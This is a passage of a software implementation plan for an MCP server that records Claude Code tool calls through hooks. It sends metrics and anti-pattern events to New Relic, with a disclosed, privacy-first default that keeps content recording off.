# New Relic MCP Observability Server — Implementation Plan

> Derived from [AGENT_MCP_SERVER_IDEATION.md](./AGENT_MCP_SERVER_IDEATION.md). Each numbered item is a self-contained block of Claude session work with implementation and testing criteria.

---

## Table of Contents

- [Phase 0: Project Bootstrap](#phase-0-project-bootstrap)
- [Phase 1: Hook Collector + Basic MCP Server (2-3 weeks)](#phase-1-hook-collector--basic-mcp-server-2-3-weeks)
- [Phase 2: Cost Tracking + Workflow Analysis (2-3 weeks)](#phase-2-cost-tracking--workflow-analysis-2-3-weeks)
- [Phase 3: MCP Proxy + Security Audit (3-4 weeks)](#phase-3-mcp-proxy--security-audit-3-4-weeks)
- [Phase 4: Cross-Session Intelligence (3-4 weeks)](#phase-4-cross-session-intelligence-3-4-weeks)
- [Phase 5: Multi-Platform Support (4-6 weeks)](#phase-5-multi-platform-support-4-6-weeks)

---

## Phase 0: Project Bootstrap

> Prerequisites that must exist before any feature work begins. The `nr-ai-mcp-server` package shares build infrastructure with the monorepo (tsconfig, jest, eslint) and depends on `@nr-ai-observatory/shared` for transport, config, logger, and pricing utilities. Phase 0 of the agent IMPLEMENTATION_PLAN must be completed first.

### ☑️ 0.1 — MCP Server TypeScript Scaffolding

**Implementation:**

- Create `packages/nr-ai-mcp-server/tsconfig.json` extending the monorepo base, with project references to `packages/shared`
- Add the MCP SDK dependency: `@modelcontextprotocol/sdk` (the official TypeScript MCP SDK)
- Add dependencies: `zod` (for input validation), `commander` (for CLI argument parsing)
- Create the source directory structure:
  ```
  packages/nr-ai-mcp-server/src/
  ├── index.ts           # CLI entry point (bin)
  ├── server.ts          # MCP server class
  ├── hooks/             # Hook collector logic
  ├── proxy/             # MCP proxy layer (Phase 3)
  ├── metrics/           # Metric computation
  ├── tools/             # MCP tools exposed to Claude Code
  ├── resources/         # MCP resources exposed to Claude Code
  └── storage/           # Local persistence
  ```
- Create `packages/nr-ai-mcp-server/src/index.ts` as the CLI entry point:
  - Parse CLI arguments with `commander`: `--port`, `--config`, `--log-level`, `--stdio` (for MCP stdio transport)
  - Initialize the server and start listening
  - The `bin` field in `package.json` already points to `dist/index.js`
- Create `packages/nr-ai-mcp-server/src/server.ts`:
  - Instantiate an MCP `Server` using the SDK with `name: 'nr-ai-observability'` and `version` from package.json
  - Register capability handlers: `tools/list`, `tools/call`, `resources/list`, `resources/read`
  - Support both `stdio` transport (for Claude Code direct connection) and `SSE`/`HTTP` transport (for proxy mode and hook collector HTTP endpoint)
- Verify `npm run build` compiles the package and the `nr-ai-mcp-server` CLI is executable

**Testing:**

- Unit test: server instantiates without error and registers expected capability handlers
- Unit test: CLI parses `--port 9847`, `--stdio`, `--config /path/to/config.json` correctly
- Unit test: server responds to `tools/list` with an empty tool list (no tools registered yet)
- Integration test: start the server in stdio mode, send a JSON-RPC `initialize` request via stdin, receive a valid response

---

### ☑️ 0.2 — MCP Server Configuration

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/config.ts`
- Define a `McpServerConfig` interface:
  - `licenseKey` (required) — New Relic ingest license key
  - `accountId` (required) — New Relic account ID (needed for Events API URL)
  - `appName` (default: `'nr-ai-mcp-server'`)
  - `developer` — developer name/identifier for attribution tagging (default: inferred from `$USER` or `git config user.name`)
  - `enabled` (default: `true`)
  - `recordContent` (default: `false` — per design decision #6, privacy-first)
  - `redactionPatterns` — array of regex patterns for sensitive field redaction (default: redact `.env` content, API keys, passwords)
  - `hookBufferPath` (default: `~/.nr-ai-observe/buffer.jsonl`)
  - `storagePath` (default: `~/.nr-ai-observe/`)
  - `harvestIntervalMs` (default: `5000` for events, `60000` for metrics)
  - `port` (default: `9847` — for HTTP transport)
  - `logLevel` (default: `'info'`)
  - `collectorHost` — NR collector endpoint (auto-detected from license key region)
- Load config from three sources in priority order:
  1. CLI arguments (highest priority)
  2. Environment variables (`NEW_RELIC_LICENSE_KEY`, `NEW_RELIC_AI_MCP_DEVELOPER`, etc.)
  3. Config file at `~/.nr-ai-observe/config.json` (lowest priority)
- Validate required fields; throw with clear error messages for missing license key or account ID
- Implement `redactSensitive(value: string, patterns: RegExp[]): string` utility — replace matched patterns with `[REDACTED]`

**Testing:**

- Unit test: config merges CLI > env > file correctly (CLI overrides env overrides file)
- Unit test: missing `licenseKey` throws descriptive error
- Unit test: `developer` defaults to `$USER` env var when not explicitly set
- Unit test: `redactSensitive()` with a string containing `API_KEY=sk-abc123` and pattern `/(?:API_KEY|SECRET)=\S+/g` -> replaces with `[REDACTED]`
- Unit test: default config values are correct (recordContent=false, port=9847, etc.)
- Unit test: EU region license key routes to EU collector endpoints

---

### ☑️ 0.3 — Local Storage Directory Setup

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/storage/local-store.ts`
- Implement `LocalStore` class that manages the `~/.nr-ai-observe/` directory structure from Section 6.5:
  - `initialize()` — create the directory tree if it doesn't exist:
    ```
    ~/.nr-ai-observe/
    ├── config.json
    ├── buffer.jsonl
    ├── sessions/
    ├── weekly_summaries/
    ├── pricing.json
    └── audit/
    ```
  - `appendToBuffer(event: HookEvent)` — append a JSON line to `buffer.jsonl` (fire-and-forget, <5ms budget per design decision #3)
  - `drainBuffer(): HookEvent[]` — read all lines from `buffer.jsonl`, parse them, clear the file, return parsed events
  - `saveSession(session: SessionSummary)` — write a session summary JSON file to `sessions/`
  - `loadRecentSessions(days: number): SessionSummary[]` — load session summaries from the last N days
  - `appendAuditLog(entry: AuditEntry)` — append to the daily audit log file in `audit/` (append-only, never deleted)
- Buffer file locking: use `O_APPEND` flag for atomic appends; for drain, rename the file to a temp name (atomic on POSIX), read the temp file, then delete it — this avoids data loss from concurrent hook writes during drain
- All file I/O should be non-blocking (`fs.promises`) except for the hook buffer append (which should use `fs.appendFileSync` for minimal latency in the hook script path)

**Testing:**

- Unit test: `initialize()` creates the expected directory structure (use a temp dir)
- Unit test: `appendToBuffer()` + `drainBuffer()` round-trips events correctly
- Unit test: concurrent appends don't corrupt the buffer file (simulate 100 rapid appends, then drain — all 100 events present)
- Unit test: `drainBuffer()` on an empty buffer returns an empty array
- Unit test: `saveSession()` writes a valid JSON file; `loadRecentSessions()` reads it back
- Unit test: `appendAuditLog()` creates a date-stamped file and appends correctly
- Unit test: audit log files are append-only — calling `appendAuditLog()` twice produces two lines in the same file

---

## Phase 1: Hook Collector + Basic MCP Server (2-3 weeks)

> **Goal**: Capture all built-in tool calls and report to New Relic.

### ☑️ 1.1 — Hook Collector Script (`nr-ai-observe` CLI)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/hooks/collector-script.ts` — the source for the `nr-ai-observe` CLI binary
- This is a lightweight shell-invocable script that Claude Code hooks call on every `PreToolUse` and `PostToolUse` event (per Section 6.2 architecture)
- The script must meet the **<5ms execution budget** (design decision #3) — it reads stdin, writes to buffer, and exits
- Implementation:
  - Read hook data from stdin (Claude Code pipes JSON with `tool_name`, `tool_input`, and for PostToolUse: `tool_output`)
  - Parse the JSON to extract: `toolName`, mode (`pre-tool` or `post-tool`)
  - For `pre-tool`: record `{ mode: 'pre', tool: toolName, timestamp: Date.now(), inputHash: hash(input), inputSize: input.length }`
  - For `post-tool`: record `{ mode: 'post', tool: toolName, timestamp: Date.now(), outputSize: output.length, success: !output.error }`
  - If `recordContent` is enabled: include redacted input/output content (truncated to configurable max length)
  - Write the event as a single JSON line to the buffer file (`~/.nr-ai-observe/buffer.jsonl`) using `fs.appendFileSync` (synchronous for speed — no event loop overhead)
- Add a secondary `bin` entry in `package.json`: `"nr-ai-observe": "dist/hooks/collector-script.js"`
- The script must be a standalone executable (add `#!/usr/bin/env node` shebang) with minimal imports (no heavy dependencies)
- Handle errors silently — if the buffer file is missing or unwritable, the script exits 0 (never block Claude Code)

**Testing:**

- Unit test: pipe a mock `PreToolUse` JSON payload via stdin -> verify a valid JSON line is appended to the buffer file
- Unit test: pipe a mock `PostToolUse` JSON payload -> verify output size, success flag, timestamp are captured
- Unit test: when `recordContent=false`, input/output content is not present in the buffer event
- Unit test: when `recordContent=true`, content is present but redacted according to patterns
- Unit test: content truncation — a 100KB tool output is truncated to the configured max length
- Unit test: execution time is <5ms for a typical payload (benchmark test)
- Unit test: if the buffer file doesn't exist, it's created automatically
- Unit test: if the buffer directory doesn't exist, the script exits 0 without error (graceful degradation)
- Unit test: concurrent writes from multiple hook invocations don't corrupt the buffer (simulate rapid sequential calls)

---

### ✅ 1.2 — Hook Event Processing & Tool Call Pairing

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/hooks/event-processor.ts`
- Implement `HookEventProcessor` class that reads raw hook events from the buffer and produces structured `ToolCallRecord` objects:
  - Poll the buffer file on a short interval (configurable, default 100ms) using `LocalStore.drainBuffer()`
  - Pair `pre-tool` and `post-tool` events for the same tool call:
    - Match by `toolName` and temporal proximity (the `post-tool` event following a `pre-tool` for the same tool is its pair)
    - Compute `durationMs = postEvent.timestamp - preEvent.timestamp`
    - Handle orphaned events: a `pre-tool` without a matching `post-tool` within a timeout (default 60s) is recorded as a `timeout` event
  - Produce a `ToolCallRecord`:
    - `id` (UUID), `sessionId`, `toolName`, `timestamp` (from pre-tool), `durationMs`
    - `success` (boolean from post-tool), `errorType` (if failed: permission denied, not found, timeout, etc.)
    - `inputSizeBytes`, `outputSizeBytes`
    - `inputHash` (for dedup/re-read detection)
    - Tool-specific parsed fields (see 1.3)
  - Emit each `ToolCallRecord` to the event buffer (shared `EventBuffer` from `@nr-ai-observatory/shared`)
- Implement `start()` / `stop()` methods to control the polling loop
- The processor runs as a background loop within the MCP server process

**Testing:**

- Unit test: a paired `pre-tool` + `post-tool` produces a valid `ToolCallRecord` with correct `durationMs`
- Unit test: ordering — `pre-tool(Read)`, `pre-tool(Grep)`, `post-tool(Grep)`, `post-tool(Read)` — correctly pairs Read-with-Read and Grep-with-Grep
- Unit test: orphaned `pre-tool` without a `post-tool` within 60s -> recorded as timeout event with `success: false`, `errorType: 'timeout'`
- Unit test: orphaned `post-tool` without a matching `pre-tool` -> logged as warning, still recorded with `durationMs: null`
- Unit test: rapid sequence of 50 tool calls -> all 50 correctly paired and processed
- Unit test: `start()` begins polling; `stop()` halts polling and processes remaining buffer
- Unit test: empty buffer drain -> no events emitted, no errors

---

### ✅ 1.3 — Tool-Specific Field Parsing (Read, Write, Edit, Bash, Grep, Glob, Agent)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/hooks/tool-parsers.ts`
- Implement tool-specific parsers that extract structured fields from each built-in tool's hook data (per Section 2.2):
  - **Read parser**: extract `filePath`, `lineRange` (offset/limit if provided), `contentLength` (bytes returned)
  - **Write parser**: extract `filePath`, `contentLength` (bytes written), `isNewFile` (true if file didn't exist before)
  - **Edit parser**: extract `filePath`, `oldStringLength`, `newStringLength`, `replaceAll` flag, `isDelete` (newString is empty)
  - **Bash parser**: extract `command` (the shell command run), `exitCode` (from post-tool output), `isTestCommand` (heuristic: command contains `test`, `jest`, `pytest`, `vitest`, `mocha`, `npm test`, `go test`), `isBuildCommand` (heuristic: `tsc`, `npm run build`, `make`, `cargo build`), `isLintCommand` (heuristic: `eslint`, `prettier`, `pylint`, `golangci-lint`), `stdoutLength`, `stderrLength`, `timedOut`
  - **Grep parser**: extract `pattern`, `path`, `matchCount` (from output), `outputMode`
  - **Glob parser**: extract `pattern`, `path`, `matchCount` (files found)
  - **Agent parser**: extract `description`, `subagentType`, `promptLength`, `mode` (background or foreground)
  - **AskUserQuestion parser**: extract `questionCount`, `optionCount` (how many choices offered)
  - **TaskCreate/TaskUpdate parser**: extract `taskId`, `status`, `subject`
- Implement a dispatcher: `parseToolSpecificFields(toolName: string, input: any, output: any): Record<string, string | number | boolean>`
  - Routes to the appropriate parser based on `toolName`
  - Returns a flat record of tool-specific attributes to attach to the `ToolCallRecord`
  - Unknown tools return an empty record (graceful handling of new tools added to Claude Code)
- If `recordContent=false`: parsers extract metadata only (file paths, lengths, counts) — never the actual content
- If `recordContent=true`: parsers also include content fields (redacted per config patterns)

**Testing:**

- Unit test: Read parser extracts `filePath`, `lineRange`, `contentLength` from a real-shaped hook payload
- Unit test: Write parser detects `isNewFile=true` when the file was newly created
- Unit test: Edit parser computes `oldStringLength`, `newStringLength` correctly; `isDelete` when newString is empty
- Unit test: Bash parser correctly identifies test commands (`npm test`, `jest --coverage`, `pytest -v`)
- Unit test: Bash parser correctly identifies build commands (`tsc`, `npm run build`)
- Unit test: Bash parser extracts `exitCode` from post-tool output
- Unit test: Grep parser extracts `pattern` and `matchCount`
- Unit test: Agent parser extracts `subagentType` and `description`
- Unit test: unknown tool name returns empty record (no error)
- Unit test: with `recordContent=false`, file paths are captured but file contents are not
- Unit test: with `recordContent=true`, content fields are present but redacted

---

### ✅ 1.4 — Session Metrics Aggregation (Tool Counts, Durations, Success Rates)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/session-tracker.ts`
- Implement `SessionTracker` class that maintains running aggregates for the current session from Sections 4.1 and 4.6:
  - **Tool usage metrics:**
    - `toolCallCount`: total tool calls
    - `toolCallCountByTool`: `Map<string, number>` — calls per tool type (Read, Write, Edit, Bash, etc.)
    - `toolDurationMsByTool`: `Map<string, { count, sum, min, max, p95 }>` — duration stats per tool
    - `toolSuccessRate`: overall and per-tool success rate
    - `toolErrorCount`: total failed tool calls
    - `toolErrorsByType`: `Map<string, number>` — errors by classification
    - `uniqueFilesRead`: `Set<string>` — distinct file paths accessed via Read
    - `uniqueFilesWritten`: `Set<string>` — distinct file paths modified via Write/Edit
    - `bashCommandsRun`: count of Bash tool invocations
    - `bashExitCodes`: `Map<number, number>` — distribution of exit codes
    - `searchQueries`: count of Grep/Glob operations
  - **Session lifecycle metrics:**
    - `sessionId`: unique identifier (generated at startup)
    - `sessionStartTime`: timestamp when the MCP server started
    - `sessionDurationMs`: computed as `now - sessionStartTime`
    - `toolCallTimeline`: ordered list of `{ timestamp, toolName, durationMs, success }` for timeline visualization
  - `recordToolCall(record: ToolCallRecord)` — update all aggregates with a new tool call
  - `getMetrics(): SessionMetrics` — return a snapshot of all current aggregates
  - `reset()` — reset for a new session (called if the MCP server is long-running across multiple Claude Code sessions)
- Emit aggregated metrics to `MetricAggregator` (from `@nr-ai-observatory/shared`) at each 60s harvest:
  - `ai.tool.call_count` (counter), `ai.tool.duration_ms` (summary, per tool), `ai.tool.success_rate` (gauge, per tool)
  - `ai.session.duration_ms` (gauge), `ai.session.unique_files_read` (gauge), `ai.session.unique_files_written` (gauge)

**Testing:**

- Unit test: `recordToolCall()` with 5 Read, 3 Edit, 2 Bash calls -> correct `toolCallCountByTool` values
- Unit test: duration stats — feed 10 calls with known durations -> verify min, max, sum, count are correct
- Unit test: success rate — 8 success, 2 failures -> 80% overall, correct per-tool rates
- Unit test: `uniqueFilesRead` — Read("a.ts"), Read("b.ts"), Read("a.ts") -> set size is 2
- Unit test: `bashExitCodes` — exit code 0 (3 times), exit code 1 (2 times) -> correct distribution
- Unit test: `getMetrics()` returns a complete snapshot of all aggregates
- Unit test: `reset()` clears all counters and sets back to initial state
- Unit test: tool call timeline is in chronological order

---

### ✅ 1.5 — New Relic Event Ingestion (Tool Call Events + Session Metrics)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/transport/nr-ingest.ts`
- Reuse the shared transport layer from `@nr-ai-observatory/shared` (Events API + Metric API from the agent's Phase 1.7 and 1.8)
- Implement `NrIngestManager` class that bridges the MCP server's data to the NR APIs:
  - **Event ingestion**: each `ToolCallRecord` is sent as an `AiToolCall` custom event to the Events API:
    ```json
    {
      "eventType": "AiToolCall",
      "tool": "Read",
      "duration_ms": 45,
      "success": true,
      "file_path": "src/auth.ts",
      "output_size_bytes": 2340,
      "session_id": "abc-123",
      "developer": "alice",
      "model": "claude-sonnet-4",
      "timestamp": 1712345678
    }
    ```
  - Include all tool-specific attributes from the parser (1.3)
  - Include session-level attributes: `session_id`, `developer`, `model` (from config)
  - **Metric ingestion**: aggregated session metrics (from 1.4) sent to Metric API at 60s intervals:
    - `ai.tool.call_count`, `ai.tool.duration_ms`, `ai.tool.success_rate` (per tool)
    - `ai.session.duration_ms`, `ai.session.unique_files_read`, etc.
  - **Harvest scheduler**: reuse `HarvestScheduler` from shared package — 5s events, 60s metrics
- Implement `start()` / `stop()` for the harvest lifecycle; `stop()` triggers a final flush
- Integrate with the MCP server lifecycle: `NrIngestManager` starts when the server starts, stops on shutdown
- Handle NR API errors gracefully: log warnings, retry with backoff, never crash the MCP server

**Testing:**

- Unit test: `ToolCallRecord` is correctly serialized to the `AiToolCall` event format
- Unit test: all tool-specific attributes are included (file paths, exit codes, command, etc.)
- Unit test: session-level attributes (`session_id`, `developer`, `model`) are attached to every event
- Unit test: harvest fires at 5s intervals for events and 60s for metrics (fake timers)
- Unit test: `stop()` triggers final flush of both events and metrics
- Unit test: NR API errors are logged and retried, not thrown
- Integration test: send test events to the real NR Events API; query with NRQL to verify they arrive (requires credentials; skip in CI if not set)

---

### ✅ 1.6 — MCP Tools: `get_session_stats` and `get_session_timeline`

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/tools/session-stats.ts`
- Register two MCP tools on the server that Claude Code (or the user via the assistant) can call to inspect session observability data:
- **`nr_observe_get_session_stats`**:
  - Input: none (no arguments)
  - Output: JSON object with current session metrics from `SessionTracker` (1.4):
    ```json
    {
      "session_duration_ms": 324000,
      "tool_calls": 47,
      "tool_calls_by_type": { "Read": 18, "Edit": 10, "Bash": 8, "Grep": 6, "Glob": 3, "Write": 2 },
      "success_rate": 0.94,
      "failed_calls": 3,
      "unique_files_read": 12,
      "unique_files_modified": 3,
      "bash_commands_run": 8,
      "tests_run": 4,
      "tests_passed": 3,
      "avg_tool_duration_ms": 156
    }
    ```
  - Register with the MCP SDK: `server.setRequestHandler(ListToolsRequestSchema, ...)` including this tool with a description and input schema (Zod)
- **`nr_observe_get_session_timeline`**:
  - Input: optional `{ last_n: number }` to limit to last N tool calls (default: 20)
  - Output: ordered list of recent tool calls with timestamps, names, durations, and success/failure:
    ```json
    {
      "timeline": [
        {
          "timestamp": "2026-04-10T14:23:01Z",
          "tool": "Read",
          "target": "src/auth.ts",
          "duration_ms": 32,
          "success": true
        },
        {
          "timestamp": "2026-04-10T14:23:02Z",
          "tool": "Edit",
          "target": "src/auth.ts",
          "duration_ms": 18,
          "success": true
        },
        {
          "timestamp": "2026-04-10T14:23:05Z",
          "tool": "Bash",
          "target": "npm test",
          "duration_ms": 4800,
          "success": false
        }
      ]
    }
    ```
- Include the MCP server's transparency disclosure in the `initialize` response (per design decision #9):
  - `instructions` field: "This server monitors tool usage for observability purposes. Metrics are sent to New Relic."

**Testing:**

- Unit test: `nr_observe_get_session_stats` returns correct JSON structure after recording 10 tool calls
- Unit test: all fields match the current `SessionTracker` state
- Unit test: `nr_observe_get_session_timeline` with `last_n: 5` returns exactly 5 most recent calls in chronological order
- Unit test: timeline entries include `target` (file path for Read/Edit, command for Bash, pattern for Grep)
- Unit test: tools appear in `tools/list` response with correct name, description, and input schema
- Unit test: MCP initialize response includes the transparency disclosure in `instructions`
- Integration test: connect to the server via stdio, call `tools/call nr_observe_get_session_stats`, verify a valid JSON response

---

### ✅ 1.7 — Pre-Built Dashboard: "AI Coding Assistant — Overview"

**Implementation:**

- Create `packages/nr-ai-mcp-server/dashboards/ai-coding-assistant-overview.json`
- Build the dashboard from Section 7 of the ideation doc:
  - **Row 1 — Session at a glance** (Billboard widgets):
    - Active session duration (`SELECT latest(ai.session.duration_ms) / 60000 AS 'Minutes' FROM Metric WHERE developer = {{developer}} SINCE 1 hour ago`)
    - Total tool calls (`SELECT sum(ai.tool.call_count) FROM Metric WHERE developer = {{developer}} SINCE 1 hour ago`)
    - Success rate (`SELECT percentage(count(*), WHERE success = true) FROM AiToolCall WHERE developer = {{developer}} SINCE 1 hour ago`)
  - **Row 2 — Tool usage** (Pie + Bar charts):
    - Tool call distribution (`SELECT count(*) FROM AiToolCall FACET tool SINCE 1 hour ago`)
    - Tool success/failure rate by tool (`SELECT percentage(count(*), WHERE success = true) FROM AiToolCall FACET tool SINCE 1 hour ago`)
    - Average tool latency by type (`SELECT average(duration_ms) FROM AiToolCall FACET tool SINCE 1 hour ago`)
  - **Row 3 — Code changes** (Bar charts):
    - Files read vs modified (`SELECT uniqueCount(file_path) FROM AiToolCall WHERE tool = 'Read' AS 'Files Read', uniqueCount(file_path) FROM AiToolCall WHERE tool IN ('Write', 'Edit') AS 'Files Modified' SINCE 1 hour ago`)
    - Bash exit code distribution (`SELECT count(*) FROM AiToolCall WHERE tool = 'Bash' FACET exit_code SINCE 1 hour ago`)
    - Test results timeline (`SELECT count(*) FROM AiToolCall WHERE tool = 'Bash' AND is_test_command = true FACET CASES(WHERE exit_code = 0 AS 'Pass', WHERE exit_code != 0 AS 'Fail') TIMESERIES SINCE 1 hour ago`)
  - **Row 4 — Tool call timeline** (Line chart):
    - Tool calls over time (`SELECT count(*) FROM AiToolCall FACET tool TIMESERIES 1 minute SINCE 1 hour ago`)
- Create a deploy script `packages/nr-ai-mcp-server/scripts/deploy-dashboard.ts` using the NerdGraph `dashboardCreate` mutation

**Testing:**

- Unit test: dashboard JSON parses correctly and follows NR dashboard API structure
- Unit test: all NRQL queries are syntactically valid
- Unit test: deploy script builds the correct NerdGraph mutation payload
- Manual test: deploy to a test NR account; verify widgets render

---

### ✅ 1.8 — Installation Instructions & Hook Configuration Generator

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/tools/install-helper.ts`
- Implement an `nr-ai-observe install` CLI subcommand that auto-configures Claude Code hooks and MCP server registration:
  - Detect the Claude Code settings file location (`~/.claude/settings.json` or project-level `.claude/settings.json`)
  - Generate the hook configuration for `PreToolUse` and `PostToolUse`:
    ```json
    {
      "hooks": {
        "PreToolUse": [
          {
            "matcher": ".*",
            "command": "nr-ai-observe pre-tool"
          }
        ],
        "PostToolUse": [
          {
            "matcher": ".*",
            "command": "nr-ai-observe post-tool"
          }
        ]
      }
    }
    ```
  - Generate the MCP server registration:
    ```json
    {
      "mcpServers": {
        "nr-ai-observability": {
          "command": "nr-ai-mcp-server",
          "args": ["--stdio"]
        }
      }
    }
    ```
  - If settings file already exists, merge the new config (don't overwrite existing hooks or MCP servers)
  - Print a summary of what was configured, with instructions for the user to verify
- Also implement `nr-ai-observe uninstall` to cleanly remove hooks and MCP server registration
- Create a `README.md`-style output explaining the quick-start flow:
  1. `npm install -g nr-ai-mcp-server`
  2. `nr-ai-observe install --license-key=... --account-id=...`
  3. Restart Claude Code
  4. Verify with: ask Claude Code to call `nr_observe_get_session_stats`

**Testing:**

- Unit test: `install` generates correct hook JSON for an empty settings file
- Unit test: `install` merges hooks into existing settings without overwriting other hooks
- Unit test: `install` adds MCP server registration without overwriting other MCP servers
- Unit test: `uninstall` removes only the nr-ai-observe hooks and MCP server, leaving others intact
- Unit test: `install` with `--license-key` writes the key to `~/.nr-ai-observe/config.json`
- Integration test: run `install` against a temp directory, verify the generated settings file is valid JSON and Claude Code would accept it

---

## Phase 2: Cost Tracking + Workflow Analysis (2-3 weeks)

> **Goal**: Add cost estimation and tool pattern analysis.

### ✅ 2.1 — Token Counting from Hook Data & Self-Reporting Tool

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/cost-tracker.ts`
- Implement token and cost tracking from Section 4.4, using a dual-source approach (per design decision #2):
  - **Primary: self-reporting tool** — expose an MCP tool that Claude Code calls to report its own token usage:
    - `nr_observe_report_tokens` — Claude Code knows its own token counts and can call this tool:
      ```
      Input: { input_tokens: number, output_tokens: number, thinking_tokens?: number,
               cache_read_tokens?: number, model: string }
      ```
    - Register this as an MCP tool that the server processes into cost metrics
    - The server can also include a hint in its `instructions` field encouraging Claude to call this tool periodically
  - **Fallback: estimation from message length** — when self-reporting is unavailable:
    - Estimate tokens from the total character length of hook input/output payloads using the heuristic: `tokens ≈ characters / 4` (rough average for English text)
    - This is a coarse estimate; log a warning when using estimation mode
- Reuse the pricing table from `@nr-ai-observatory/shared` (agent Phase 1.5) for cost calculation:
  - `calculateCost(model, tokenUsage)` -> `{ inputUsd, outputUsd, thinkingUsd, totalUsd }`
- Implement `CostTracker` class:
  - `recordTokenUsage(usage: TokenUsage)` — record tokens from self-reporting or estimation
  - `sessionTotalCostUsd`: running cumulative cost for the session
  - `costByTask`: if task boundaries are detected (see 2.3), cost per task
  - `costPerLineOfCode`: `sessionTotalCostUsd / totalLinesChanged` (from Edit/Write hook data)
  - `costPerFileModified`: `sessionTotalCostUsd / uniqueFilesWritten`
  - `model`: model in use (from self-reporting or config)
- Emit metrics: `ai.cost.session_total_usd`, `ai.cost.model_used`, `ai.cost.tokens_input`, `ai.cost.tokens_output`

**Testing:**

- Unit test: `nr_observe_report_tokens` tool processes token data and updates `CostTracker`
- Unit test: cost calculation for 10,000 input + 2,000 output tokens on `claude-sonnet-4` matches expected USD
- Unit test: estimation fallback — 4000 characters -> approximately 1000 tokens
- Unit test: `sessionTotalCostUsd` accumulates correctly across multiple reports
- Unit test: `costPerLineOfCode` — $2.00 session cost, 100 lines changed -> $0.02/line
- Unit test: `costPerFileModified` — $2.00 session cost, 4 files modified -> $0.50/file
- Unit test: when no tokens reported and no estimation data, cost fields are null (not zero)

---

### ✅ 2.2 — Task Boundary Detection (User Message -> Tool Sequence -> Response)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/task-detector.ts`
- Implement heuristic task boundary detection from Section 4.2:
  - A "task" is defined as the work Claude Code does between user messages: the user gives an instruction, Claude executes a series of tool calls, and eventually responds
  - **Detection signals:**
    - A gap in tool call activity of >30 seconds (configurable) suggests the task is complete and Claude is waiting for user input
    - An `AskUserQuestion` tool call signals the end of a task phase (Claude is asking for direction)
    - A `TaskCreate`/`TaskUpdate` tool call can provide explicit task boundaries
    - A sequence of tool calls followed by no more calls (timeout-based task end)
  - **Task lifecycle:**
    - `TaskBoundary.start()` — triggered by the first tool call after an idle period
    - `TaskBoundary.end()` — triggered by idle timeout, user question, or explicit task completion
    - Between start and end: accumulate tool calls, token usage, cost, files touched
  - **Output per detected task**: `AiCodingTask` event:
    - `taskId`, `startTime`, `endTime`, `durationMs`
    - `toolCallCount`, `toolCallsByType`, `filesRead`, `filesModified`, `linesChanged`
    - `bashCommandsRun`, `testsRun`, `testsPassed`, `buildRun`, `buildPassed`
    - `estimatedCostUsd`, `tokensUsed`
    - `askedUserQuestions` (count of AskUserQuestion calls during this task)
    - `subAgentsSpawned` (count of Agent tool calls)
- Implement `TaskDetector` class:
  - `recordToolCall(record: ToolCallRecord)` — feed tool calls; detect boundaries
  - `getCurrentTask(): Task | null` — return the current in-progress task
  - `getCompletedTasks(): Task[]` — return all completed tasks in the session
  - Emit `AiCodingTask` events to the event buffer when tasks complete

**Testing:**

- Unit test: 5 tool calls within 10 seconds, then 45 seconds idle -> 1 task detected with 5 tool calls
- Unit test: 3 tool calls, then `AskUserQuestion`, then 3 more tool calls -> 2 tasks detected
- Unit test: a single tool call followed by idle timeout -> 1 task with 1 tool call
- Unit test: task correctly accumulates `filesRead`, `filesModified`, `linesChanged` from child tool calls
- Unit test: task correctly counts test runs and passes from Bash tool calls with `isTestCommand=true`
- Unit test: task correctly counts agent spawns from Agent tool calls
- Unit test: `estimatedCostUsd` on the task matches the sum of costs during the task boundary
- Unit test: rapid continuous tool calls (no idle gap) -> single long task, not many short ones
- Unit test: `getCompletedTasks()` returns tasks in chronological order

---

### ✅ 2.3 — Anti-Pattern Detection (Thrashing, Re-Reading, Stuck Loops, Blind Editing)

**Implementation:**

- Create `packages/nr-ai-mcp-server/src/metrics/anti-patterns.ts`
- Implement the tool call pattern detectors from Section 5.2:
  - **Thrashing**: `Edit(file) -> Bash(test:FAIL) -> Edit(file) -> Bash(test:FAIL)` repeated >N times (configurable, default 3)
    - Detection: track sequences of `(Edit on file X, Bash test FAIL)` pairs; if the same file appears in >N consecutive fail cycles, flag it
    - Emit: `AiAntiPattern` event with `type: 'thrashing'`, `file`, `iterations`, `suggestion: 'Consider reading the test output more carefully or reading the test framework docs'`
  - **Re-reading**: reading the same file repeatedly within a task
    - Detection: track `Read` calls per file within a task; if the same file is read >3 times, flag it
    - `readEfficiency = uniqueFilesRead / totalReadCalls` (lower = more re-reading)
    - Emit: `AiAntiPattern` event with `type: 're_reading'`, `file`, `readCount`, `suggestion: 'Context may have been compressed — consider breaking the task into smaller pieces'`
  - **Stuck loop**: running the same Bash command repeatedly with same arguments
    - Detection: hash `(command)` pairs; if the same hash appears >3 times consecutively, flag it
    - Emit: `AiAntiPattern` event with `type: 'stuck_loop'`, `command`, `repeatCount`
  - **Blind editing**: multiple Edit/Write calls to the same file without any Bash test/build/lint between them
    - Detection: track `(Edit/Write on file X)` sequences; if >3 edits without a verification command, flag it
    - `verifyRate = editsFollowedByTest / totalEdits`
    - Emit: `AiAntiPattern` event with `type: 'blind_editing'`, `file`, `editCount`, `suggestion: 'Verify changes with tests between edits'`
  - **Over-delegation**: spawning >3 sub-agents within a single task
    - Detection: count Agent tool calls per task
    - Emit: `AiAntiPattern` event with `type: 'over_delegation'`, `agentCount`
- Implement `AntiPatternDetector` class:
  - `analyze(toolCalls: ToolCallRecord[]): AntiPattern[]` — run all detectors against a task's tool call sequence
  - Called automatically by `TaskDetector` (2.2) when a task completes
  - Also callable during a task for real-time detection (e.g., flag thrashing after 3 consecutive failures rather than waiting for task end)
- Emit `AiAntiPattern` events and aggregate metrics: `ai.anti_pattern.count` (counter, by type), `ai.anti_pattern.thrash_rate` (gauge)

**Testing:**

- Unit test: thrashing — `Edit(a.ts), Bash(test:FAIL), Edit(a.ts), Bash(test:FAIL), Edit(a.ts), Bash(test:FAIL)` -> detected with `iterations: 3`
- Unit test: thrashing — `Edit(a.ts), Bash(test:PASS)` -> not detected
